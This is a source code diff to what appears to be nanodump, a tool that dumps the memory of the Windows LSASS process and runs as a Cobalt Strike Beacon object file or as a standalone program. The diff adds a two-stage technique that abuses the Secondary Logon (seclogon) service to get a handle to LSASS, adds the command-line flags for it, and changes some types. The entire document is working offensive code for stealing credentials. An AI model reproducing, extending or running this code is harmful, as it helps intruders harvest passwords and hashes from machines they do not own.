@@ -5,7 +5,7 @@
 #include "modules.c"
 #include "syscalls.c"
 #include "debugpriv.c"
-
+#include "malseclogon.c"
 
 void writeat(
     Pdump_context dc,
@@ -48,8 +48,8 @@ BOOL append(
 }
 
 BOOL write_file(
-    char fileName[],
-    char fileData[],
+    LPCSTR fileName,
+    PBYTE fileData,
     ULONG32 fileLength
 )
 {
@@ -168,7 +168,7 @@ BOOL write_file(
 
 #ifdef BOF
 BOOL download_file(
-    char fileName[],
+    LPCSTR fileName,
     char fileData[],
     ULONG32 fileLength
 )
@@ -850,7 +850,7 @@ void go(char* args, int length)
 {
     datap   parser;
     int     pid;
-    char*   dump_name;
+    LPCSTR  dump_name;
     BOOL    do_write;
     BOOL    fork;
     BOOL    dup;
@@ -860,6 +860,8 @@ void go(char* args, int length)
     SHORT   Version;
     SHORT   ImplementationVersion;
     BOOL    get_pid_and_leave;
+    BOOL    use_seclogon;
+    LPCSTR  nanodump_binary;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
@@ -869,6 +871,8 @@ void go(char* args, int length)
     fork = (BOOL)BeaconDataInt(&parser);
     dup = (BOOL)BeaconDataInt(&parser);
     get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
+    use_seclogon = (BOOL)BeaconDataInt(&parser);
+    nanodump_binary = BeaconDataExtract(&parser, NULL);
 
     if (get_pid_and_leave)
     {
@@ -915,10 +919,41 @@ void go(char* args, int length)
         return;
     }
 
+    if (use_seclogon)
+    {
+        success = seclogon_stage_1(
+            nanodump_binary,
+            dump_name,
+            fork,
+            dup,
+            use_valid_sig,
+            pid
+        );
+        if (success)
+        {
+            print_success(
+                dump_name,
+                use_valid_sig,
+                TRUE,
+                FALSE
+            );
+        }
+        else
+        {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "SecLogon technique failed!\n"
+            );
+        }
+        return;
+    }
+
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         fork,
-        dup
+        dup,
+        FALSE,
+        dump_name
     );
     if (!hProcess)
         return;
@@ -997,22 +1032,26 @@ void usage(char* procname)
     printf("            duplicate an existing LSASS handle (optional)\n");
     printf("    --pid PID, -p PID\n");
     printf("            the PID of LSASS (required if --fork or --dup are used)\n");
+    printf("    --seclogon, -sl\n");
+    printf("            obtain a handle to LSASS by (ab)using seclogon\n");
     printf("    --help, -h\n");
     printf("            print this help message and leave");
 }
 
 int main(int argc, char* argv[])
 {
-    int     pid = 0;
+    DWORD   pid = 0;
     BOOL    fork = FALSE;
     BOOL    dup = FALSE;
-    char*   dump_name = NULL;
+    LPCSTR  dump_name = NULL;
     ULONG32 Signature;
     SHORT   Version;
     SHORT   ImplementationVersion;
     BOOL    success;
     BOOL    use_valid_sig = FALSE;
     BOOL    get_pid_and_leave = FALSE;
+    BOOL    use_seclogon = FALSE;
+    BOOL    is_seclogon_stage_2 = FALSE;
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1067,6 +1106,16 @@ int main(int argc, char* argv[])
         {
             dup = TRUE;
         }
+        else if (!strncmp(argv[i], "-sl", 4) ||
+                 !strncmp(argv[i], "--seclogon", 11))
+        {
+            use_seclogon = TRUE;
+        }
+        else if (!strncmp(argv[i], "-s2", 4) ||
+                 !strncmp(argv[i], "--stage2", 9))
+        {
+            is_seclogon_stage_2 = TRUE;
+        }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
         {
@@ -1117,6 +1166,12 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    if (use_seclogon && !is_seclogon_stage_2 && !pid)
+    {
+        printf("Seclogon requires a PID\n");
+        return -1;
+    }
+
     // set the signature
     if (use_valid_sig)
     {
@@ -1142,13 +1197,44 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    if (use_seclogon && !is_seclogon_stage_2)
+    {
+        success = seclogon_stage_1(
+            argv[0],
+            dump_name,
+            fork,
+            dup,
+            use_valid_sig,
+            pid
+        );
+        if (success)
+        {
+            print_success(
+                dump_name,
+                use_valid_sig,
+                TRUE,
+                FALSE
+            );
+            return 0;
+        }
+        else
+        {
+            printf(
+                "SecLogon technique failed!\n"
+            );
+            return -1;
+        }
+    }
+
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         fork,
-        dup
+        dup,
+        is_seclogon_stage_2,
+        dump_name
     );
     if (!hProcess)
-        return -1;
+        return FALSE;
 
     // allocate a chuck of memory to write the dump
     SIZE_T RegionSize = DUMP_MAX_SIZE;
@@ -1189,12 +1275,15 @@ int main(int argc, char* argv[])
 
     if (success)
     {
-        print_success(
-            dump_name,
-            use_valid_sig,
-            TRUE,
-            FALSE
-        );
+        if (!is_seclogon_stage_2)
+        {
+            print_success(
+                dump_name,
+                use_valid_sig,
+                TRUE,
+                FALSE
+            );
+        }
         return 0;
     }
     else
